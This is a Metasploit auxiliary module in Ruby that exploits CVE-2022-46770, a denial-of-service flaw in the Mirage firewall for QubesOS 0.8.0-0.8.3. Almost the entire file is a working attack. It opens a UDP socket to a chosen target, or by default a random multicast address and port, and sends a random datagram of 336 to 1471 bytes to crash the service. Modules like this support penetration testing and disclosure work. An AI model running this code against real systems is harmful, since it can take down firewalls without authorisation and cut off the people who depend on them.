##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Mirage firewall for QubesOS 0.8.0-0.8.3 Denial of Service (DoS) Exploit',
        'Description' => %q{
          This module allows remote attackers to cause a denial of service (DoS)
          in Mirage firewall for QubesOS 0.8.0-0.8.3 via a specifically crafted UDP request.
        },
        'Author' => 'Krzysztof Burghardt <krzysztof@burghardt.pl>',
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2022-46770' ],
          [ 'URL', 'https://mirage.io/blog/MSA03' ],
          [ 'URL', 'https://github.com/mirage/qubes-mirage-firewall/issues/166' ],
        ],
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        },
        'DisclosureDate' => '2022-12-04'
      )
    )

    register_options(
      [
        OptAddress.new('RHOST', [ false, 'Target address (Default: random)' ]),
        OptPort.new('RPORT', [ false, 'Target port (Default: random)' ]),
      ]
    )

    deregister_options('RHOSTS')
  end

  def run
    rhost = datastore['RHOST'] || [239, 255, Random.new.rand(255), Random.new.rand(255)].join('.')
    rport = datastore['RPORT'] || Random.new.rand(65535)
    connect_udp(true, 'RHOST' => rhost, 'RPORT' => rport)

    size = Random.new.rand(336...1472)
    pkt = Random.new.bytes(size)
    print_status("Sending random datagram of #{size} bytes to #{rhost}:#{rport}...")
    udp_sock.put(pkt)

    disconnect_udp
  end
end
